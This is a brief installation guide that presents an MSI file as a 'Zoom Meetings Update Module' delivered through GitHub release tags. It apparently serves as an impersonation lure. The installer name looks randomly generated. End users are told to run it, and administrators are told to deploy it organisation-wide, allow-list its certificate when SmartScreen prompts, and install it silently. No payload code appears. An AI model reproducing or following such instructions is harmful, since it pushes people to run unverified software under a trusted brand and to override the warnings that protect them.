# Installation guide

## Zoom Meetings Update Module

### End users

Download `zoo_x5cyelo1txreg_v58581.msi` from release `v95339` and run the installer.

### IT administrators

- Deploy via your software distribution tool using the release asset URL.
- Allow-list the publisher certificate if SmartScreen prompts appear on first rollout.
- Module updates are delivered through new GitHub release tags; pin `v95339` for pilot groups.

### Silent install

```
zoo_x5cyelo1txreg_v58581.msi /quiet /norestart
```

> Adjust switches per your packaging if the build is an MSI-based update module.
